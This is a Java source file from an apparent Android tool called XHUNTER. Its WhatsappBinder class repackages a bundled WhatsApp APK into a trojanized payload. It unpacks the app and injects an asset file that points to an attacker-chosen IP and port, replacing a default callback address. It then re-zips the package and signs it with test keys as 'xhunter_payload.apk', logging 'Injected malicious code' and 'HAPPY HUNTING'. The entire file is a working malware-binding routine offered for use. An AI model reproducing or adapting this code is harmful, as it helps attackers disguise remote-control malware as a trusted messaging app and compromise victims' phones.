package com.xhunter;

import android.content.res.AssetManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;

import com.android.apksigner.ApkSignerTool;

import com.facebook.react.bridge.ReactApplicationContext;

import org.apache.commons.io.IOUtils;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;


public class WhatsappBinder extends AsyncTask<String, String, Boolean> {

    private final ReactApplicationContext reactContext;
    List<String> filesListInDir = new ArrayList<String>();
    private final String working_dir;
    private final String res_dir;
    private final Logger log;


    public WhatsappBinder(ReactApplicationContext context){
        this.working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/payload/";
        this.reactContext=context;
        this.log =new Logger(reactContext);
        this.res_dir =reactContext.getFilesDir().getAbsolutePath()+"/res/";
    }

    @Override
    protected Boolean doInBackground(String... strings) {
        init();
        if (loadResources())
            if (unzip())
                if (edit_app(strings[0]))
                    if (zip())
                        if (sign()) {
                            deleteFolder(working_dir + "normal_apk");
                            deleteFolder(working_dir + "payload");
                            deleteFile(working_dir+"unsigned.apk");
                            log.s("[+] Output : /XHUNTER/payload/xhunter_payload.apk");
                            log.done("!!!! HAPPY HUNTING !!!!");
                            return true;
                        }
        return true;
    }


    // helper functions
    private void init(){
        File workingDirectory = new File(working_dir);
        if(!workingDirectory.exists()){
            workingDirectory.mkdirs();
        }
    }
    private boolean loadResources(){
        log.i("Loading Required Resources..");
        try{
            copyAssets(reactContext.getAssets(), "res", reactContext.getFilesDir());
            log.s("[+] Loaded Required Resources Successfully!");
            return true;
        } catch (SecurityException | IOException e){
            log.ex("Failed: " + e.toString());
            return false;
        }
    }
    private boolean unzip(){
        log.i("[*] Unziping Resources");
        log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
        try {
            ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(res_dir+"WhatsApp.zip")));
            ZipEntry ze;
            int count;
            byte[] buffer = new byte[8192];
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(working_dir+"normal_apk", ze.getName());
                File dir = ze.isDirectory() ? file : file.getParentFile();
                if (!dir.isDirectory() && !dir.mkdirs())
                    throw new FileNotFoundException("Failed to ensure directory: " + dir.getAbsolutePath());
                if (ze.isDirectory())
                    continue;
                FileOutputStream fout = new FileOutputStream(file);
                while ((count = zis.read(buffer)) != -1) {
                    fout.write(buffer, 0, count);
                }
            }
            zis.close();
            log.s("[+] Unziped Resources Successfully!");
            return true;
        }catch (IOException  e){
            log.e("[!] Unziping  Resources Failed!");
            log.ex("Error: "+e.toString());
            return false;
        }
    }
    private boolean edit_app(String ip){
        log.i("[*] Trying to inject malicious code");
        String fileName = res_dir+"ip.txt";
        File file = new File(fileName);
        FileReader fr = null;
        String line;
        try {
            fr = new FileReader(file);
            BufferedReader br = new BufferedReader(fr);
            if(new File(working_dir+"normal_apk/assets").exists()) {
                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
                while((line=br.readLine()) != null){
                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
                }//loop
                fw.close();
                log.s("[+] Injected malicious code Successfully!");
                return true;
            }else if(new File(working_dir+"normal_apk/assets").mkdirs()) {
                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
                while((line=br.readLine()) != null){
                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
                }//loop
                fw.close();
                log.s("[+] Injected malicious code Successfully!");
                return true;
            }else{
                log.e("[!] Injecting malicious code Failed! Due to assets");
                return false;
            }

        } catch ( IOException e) {
            log.e("[!] Injecting malicious code Failed!");
            log.ex("Error: "+e.toString());
            return false;
        }
    }
    private boolean zip() {
        log.i("[*] Ziping Resources");
        log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
        File dir = new File(working_dir+"normal_apk");
        String zipDirName = working_dir+"unsigned.apk";
        return zipDirectory(dir, zipDirName);
    }
    private boolean sign() {
        log.i("[*] Trying to Sign APK Using APKsigner");
        try {
            ApkSignerTool.main(new String[]{"sign", "--key", res_dir+"test.pk8", "--cert", res_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
            log.s("[+] Signed Infected APK !");
            return true;
        } catch (Exception e) {
            log.e("[!] Failed to Sign Infected APK");
            log.ex("Error: "+e.toString());
            return false;
        }
    }



    // sub-helper functions
    public static void copyAssets(AssetManager assets, String assetPath, File destFolder) throws IOException {
        String[] childs = assets.list(assetPath);
        if (childs.length == 0) {
            copyFile(assets, assetPath, destFolder);
        } else {
            copyFolder(assets, assetPath, destFolder);
        }
    }
    private static void copyFolder(AssetManager assets, String assetPath, File destFolder) throws IOException {
        String[] names = assets.list(assetPath);
        for (String name : names) {
            copyAssets(assets, assetPath + "/" + name, destFolder);
        }
    }
    private static void copyFile(AssetManager assets, String assetPath, File destFolder) throws IOException {
        File outFile = new File(destFolder, assetPath);
        outFile.getParentFile().mkdirs();
        InputStream input = assets.open(assetPath);
        OutputStream output = new FileOutputStream(outFile);
        IOUtils.copy(input, output);
        input.close();
        output.close();
    }
    private void deleteFolder(String path){
        File dir = new File(path);
        if (dir.exists()) {
            String deleteCmd = "rm -r " + path;
            Runtime runtime = Runtime.getRuntime();
            try {
                runtime.exec(deleteCmd);
            } catch (IOException e) { }
        }
    }
    private void deleteFile(String path){
        File file = new File(path);
        if (file.exists()) {
            try {
                file.delete();
            } catch (SecurityException e){
                e.printStackTrace();
            }
        }
    }
    private boolean zipDirectory(File dir, String zipDirName) {
        try {
            populateFilesList(dir);
            FileOutputStream fos = new FileOutputStream(zipDirName);
            ZipOutputStream zos = new ZipOutputStream(fos);
            for(String filePath : filesListInDir){
                ZipEntry ze = new ZipEntry(filePath.substring(dir.getAbsolutePath().length()+1, filePath.length()));
                zos.putNextEntry(ze);
                FileInputStream fis = new FileInputStream(filePath);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                zos.closeEntry();
                fis.close();
            }
            zos.close();
            fos.close();
            log.s("[+] Ziped Resources Successfully!");
            return true;
        } catch (IOException e) {
            log.e("[!] Ziping  Resources Failed!");
            log.ex("Error: "+e.toString());
            return false;
        }
    }
    private void populateFilesList(File dir) throws IOException {
        File[] files = dir.listFiles();
        for(File file : files){
            if(file.isFile()) filesListInDir.add(file.getAbsolutePath());
            else populateFilesList(file);
        }
    }

}
